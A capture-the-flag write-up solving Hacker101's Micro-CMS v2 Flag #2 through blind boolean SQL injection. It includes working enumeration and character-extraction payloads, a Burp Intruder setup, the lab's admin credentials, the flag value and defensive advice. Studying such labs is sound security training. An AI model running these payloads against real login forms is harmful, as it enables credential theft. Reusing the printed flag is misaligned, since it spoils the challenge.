@@ -1,0 +1,315 @@
+================================
+LAB: Micro-CMS v2 - Flag #2
+================================
+
+[LAB INFORMATION]
+-----------------
+Date: February 1-2, 2026
+Lab URL: https://0d8005a07c1f2caf4a69a570ac7110b3.ctf.hacker101.com/
+Category: Blind SQL Injection / Credential Extraction
+Level: Medium
+Objective: Extract real admin credentials from database using blind SQL injection character enumeration
+Description: After bypassing authentication with UNION SELECT, an HTML comment hints at finding the real credentials: "Do you have the real username and password? If not, might want to do that!" This challenge requires blind SQL injection to extract credentials character by character.
+
+[RECONNAISSANCE]
+----------------
+1. Post-Authentication Discovery:
+   After Flag #1 exploitation, HTML comment revealed:
+   "You got logged in, congrats! Do you have the real username and password? If not, might want to do that!"
+
+   Implications:
+   - Real credentials exist in database
+   - UNION bypass creates fake session
+   - Legitimate credentials likely trigger different response/flag
+   - Need to extract actual username and password
+
+2. Database Structure Enumeration:
+   Using UNION SELECT with information_schema to map database:
+
+   Payload: username=' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 0#&password=admins
+
+   Tables discovered:
+   - admins (OFFSET 0)
+   - pages (OFFSET 1)
+
+3. Column Enumeration for 'admins' Table:
+   Payload: username=' UNION SELECT column_name FROM information_schema.columns WHERE table_name='admins' LIMIT 1 OFFSET §0§#&password=§column§
+
+   Using Burp Intruder Cluster Bomb:
+   - Position 1: OFFSET (0, 1, 2, 3)
+   - Position 2: Common column names (id, username, password, email)
+
+   Columns found in 'admins' table:
+   - id (OFFSET 0)
+   - username (OFFSET 1)
+   - password (OFFSET 2)
+
+4. Admin User Count Verification:
+   Payload: username=' UNION SELECT CASE WHEN (SELECT COUNT(*) FROM admins LIMIT 1 OFFSET 1)>0 THEN 'MATCH' ELSE 'NOPE' END#&password=MATCH
+
+   Response: "Invalid password"
+   Conclusion: Only one admin user exists in database
+
+[VULNERABILITY DISCOVERY]
+-------------------------
+1. Blind SQL Injection Confirmation:
+   Previous Flag #1 confirmed SQL injection exists in username parameter
+   Query structure: SELECT password FROM admins WHERE username='INPUT'
+
+   Backend behavior:
+   - Compares query result with input password
+   - Success → "Logged In!"
+   - Mismatch → "Invalid password"
+   - No result → "Unknown user"
+
+2. Blind Boolean-Based Technique:
+   Strategy: Use CASE WHEN with SUBSTRING to test each character
+
+   Logic:
+   - Extract one character at a time from username/password
+   - Compare extracted character with test character
+   - If match → return known value ('match')
+   - If no match → return different value ('nomatch')
+   - Backend comparison reveals success/failure
+
+3. SUBSTRING Function Testing:
+   Test payload for first character of username:
+   username=' UNION SELECT CASE WHEN SUBSTRING((SELECT username FROM admins LIMIT 1),1,1)='a' THEN 'match' ELSE 'nomatch' END#&password=match
+
+   Execution flow:
+   - SUBSTRING(...,1,1) extracts character at position 1
+   - If character is 'a' → returns 'match'
+   - Backend compares 'match' == 'match' → "Logged In!"
+   - If character is not 'a' → returns 'nomatch' → "Invalid password"
+
+[EXPLOITATION]
+--------------
+
+## Phase 1: Username Extraction
+
+1. Burp Intruder Configuration:
+   Attack Type: Cluster Bomb
+   Target: POST /login HTTP/2
+
+   Payload Template:
+   username=' UNION SELECT CASE WHEN SUBSTRING((SELECT username FROM admins LIMIT 1),§1§,1)='§2§' THEN 'match' ELSE 'nomatch' END#&password=match
+
+2. Position Markers:
+   Position 1 (§1§): Character position in string
+   Position 2 (§2§): Character to test
+
+3. Payload Sets:
+   Position 1 - Character Index:
+   Type: Numbers
+   Range: 1-15 (sequential)
+   Payloads: 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15
+
+   Position 2 - Character Set:
+   Type: Simple list
+   Payloads: a, b, c, d, e, f, g, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z, A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, -, _
+   Total: 64 characters
+
+4. Grep Match Configuration:
+   Options → Grep - Match
+   Add phrase: "Logged In!"
+
+   This identifies successful character matches
+
+5. Attack Execution:
+   Total possible requests: 15 positions × 64 characters = 960 requests
+   Actual requests: ~7 (username length) × 64 = ~448 requests max
+   Time: 3-5 minutes depending on connection speed
+
+6. Username Extraction Results:
+   Position 1, Character 's' → "Logged In!" ✓
+   Position 2, Character 'h' → "Logged In!" ✓
+   Position 3, Character 'o' → "Logged In!" ✓
+   Position 4, Character 'n' → "Logged In!" ✓
+   Position 5, Character 'd' → "Logged In!" ✓
+   Position 6, Character 'r' → "Logged In!" ✓
+   Position 7, Character 'a' → "Logged In!" ✓
+   Position 8, No matches → Username complete
+
+   Extracted Username: shondra
+
+7. Username Verification:
+   POST /login HTTP/2
+   Content-Type: application/x-www-form-urlencoded
+
+   username=shondra&password=test
+
+   Response: "Invalid password" (confirms username exists)
+
+## Phase 2: Password Extraction
+
+1. Modified Payload for Password:
+   username=' UNION SELECT CASE WHEN SUBSTRING((SELECT password FROM admins LIMIT 1),§1§,1)='§2§' THEN 'match' ELSE 'nomatch' END#&password=match
+
+   Same Intruder configuration as username extraction
+
+2. Password Extraction Results:
+   Position 1, Character 'a' → "Logged In!" ✓
+   Position 2, Character 'n' → "Logged In!" ✓
+   Position 3, Character 'n' → "Logged In!" ✓
+   Position 4, Character 'a' → "Logged In!" ✓
+   Position 5, Character 'b' → "Logged In!" ✓
+   Position 6, Character 'e' → "Logged In!" ✓
+   Position 7, Character 'l' → "Logged In!" ✓
+   Position 8, Character 'l' → "Logged In!" ✓
+   Position 9, Character 'e' → "Logged In!" ✓
+   Position 10, No matches → Password complete
+
+   Extracted Password: annabelle
+
+## Phase 3: Credential Validation and Flag Retrieval
+
+1. Legitimate Authentication:
+   POST /login HTTP/2
+   Host: 0d8005a07c1f2caf4a69a570ac7110b3.ctf.hacker101.com
+   Content-Type: application/x-www-form-urlencoded
+   Content-Length: 35
+
+   username=shondra&password=annabelle
+
+2. Response with Flag:
+   HTTP/2 200 OK
+   Date: Mon, 02 Feb 2026 00:54:20 GMT
+   Content-Type: text/html; charset=utf-8
+   Content-Length: 76
+   Server: openresty/1.27.1.2
+
+   ^FLAG^0318e90a1840bf12cdd8c899a96b423b09b3c3d243821e1aa26dd37ed9b2e624$FLAG$
+
+[EVIDENCE]
+----------
+Flag #2: 0318e90a1840bf12cdd8c899a96b423b09b3c3d243821e1aa26dd37ed9b2e624
+
+Extracted Credentials:
+- Username: shondra
+- Password: annabelle
+
+Sample Blind SQLi Requests:
+
+1. Testing username position 1, character 's':
+   POST /login HTTP/2
+   Content-Type: application/x-www-form-urlencoded
+
+   username=%27+UNION+SELECT+CASE+WHEN+SUBSTRING%28%28SELECT+username+FROM+admins+LIMIT+1%29%2C1%2C1%29%3D%27s%27+THEN+%27match%27+ELSE+%27nomatch%27+END%23&password=match
+
+   Response: HTTP/2 200 OK - "Logged In!"
+
+2. Testing password position 1, character 'a':
+   POST /login HTTP/2
+   Content-Type: application/x-www-form-urlencoded
+
+   username=%27+UNION+SELECT+CASE+WHEN+SUBSTRING%28%28SELECT+password+FROM+admins+LIMIT+1%29%2C1%2C1%29%3D%27a%27+THEN+%27match%27+ELSE+%27nomatch%27+END%23&password=match
+
+   Response: HTTP/2 200 OK - "Logged In!"
+
+3. Final validation with real credentials:
+   POST /login HTTP/2
+
+   username=shondra&password=annabelle
+
+   Response: ^FLAG^0318e90a1840bf12cdd8c899a96b423b09b3c3d243821e1aa26dd37ed9b2e624$FLAG$
+
+Burp Intruder Statistics:
+- Total requests for username: ~448
+- Total requests for password: ~576
+- Total time: ~6-8 minutes
+- Success rate: 100%
+
+[LESSONS LEARNED]
+-----------------
+1. Blind SQL Injection Methodology:
+   - Character-by-character extraction is reliable when direct output is unavailable
+   - SUBSTRING(string, position, length) extracts individual characters
+   - CASE WHEN conditions create Boolean responses
+   - Authentication success/failure acts as Boolean oracle
+   - Requires patience but extremely reliable technique
+
+2. Burp Intruder Cluster Bomb Strategy:
+   - Two payload positions: character index and character value
+   - Position 1: Sequential numbers (1, 2, 3...)
+   - Position 2: Character set (a-z, A-Z, 0-9, special chars)
+   - Grep Match identifies successful responses
+   - Efficient for systematic enumeration
+
+3. Optimization Techniques:
+   - Start with lowercase letters (most common in passwords)
+   - Expand to uppercase and numbers if needed
+   - Can determine length first using LENGTH() function
+   - Binary search can reduce total requests (test ranges A-M vs N-Z)
+   - Case-insensitive comparison reduces character set
+   - Stop testing when no matches found (end of string)
+
+4. Information Schema Exploitation:
+   - MySQL information_schema.tables contains all table metadata
+   - information_schema.columns contains column definitions
+   - WHERE table_schema=database() filters to current database
+   - LIMIT/OFFSET enables systematic enumeration
+   - Essential for understanding database structure before data extraction
+
+5. Challenge Design Insights:
+   - HTML comments provide crucial hints
+   - "Credentials are secret, flags are secret" indicates credential extraction
+   - Different authentication methods yield different flags
+   - Bypass session (admin:true) differs from legitimate session
+   - Multi-stage exploitation requires reading hints carefully
+
+6. Attack Workflow:
+   - Phase 1: Confirm SQL injection vulnerability
+   - Phase 2: Map database structure (tables, columns)
+   - Phase 3: Determine data extraction method (blind vs. direct)
+   - Phase 4: Extract sensitive data systematically
+   - Phase 5: Validate extracted information
+   - Phase 6: Leverage credentials for further access
+
+7. Defensive Recommendations:
+
+   Input Validation:
+   - Use parameterized queries (prepared statements) exclusively
+   - Never concatenate user input into SQL queries
+   - Whitelist allowed characters in usernames
+   - Enforce maximum length limits
+   - Reject special SQL characters
+
+   Error Handling:
+   - Implement generic error messages
+   - Never expose SQL errors to users
+   - Use consistent response times (prevent timing attacks)
+   - Log detailed errors server-side only
+
+   Rate Limiting:
+   - Implement strict rate limiting on authentication endpoints
+   - Limit requests per IP address (e.g., 10 per minute)
+   - Implement account lockout after failed attempts
+   - Monitor for automated attack patterns
+   - Alert on suspicious authentication patterns
+
+   Database Security:
+   - Use least privilege for database accounts
+   - Application user should NOT have access to information_schema
+   - Separate database users for read vs. write operations
+   - Hash passwords with strong algorithms (bcrypt, Argon2)
+   - Salt all password hashes
+   - Never store plaintext passwords
+
+   Additional Security Layers:
+   - Implement multi-factor authentication (MFA)
+   - Use Web Application Firewall (WAF) with blind SQLi rules
+   - Deploy intrusion detection systems (IDS)
+   - Regular penetration testing
+   - Security awareness training for developers
+   - Code review focusing on database interactions
+   - Automated security scanning in CI/CD pipeline
+
+8. Technical Skills Demonstrated:
+   - Blind Boolean-based SQL injection
+   - Character-by-character data extraction
+   - Database enumeration via information_schema
+   - Burp Suite Intruder mastery (Cluster Bomb)
+   - Pattern recognition in automated responses
+   - Systematic methodology for credential extraction
+   - SQL function usage (SUBSTRING, CASE WHEN, LENGTH)
+   - HTTP request manipulation and analysis
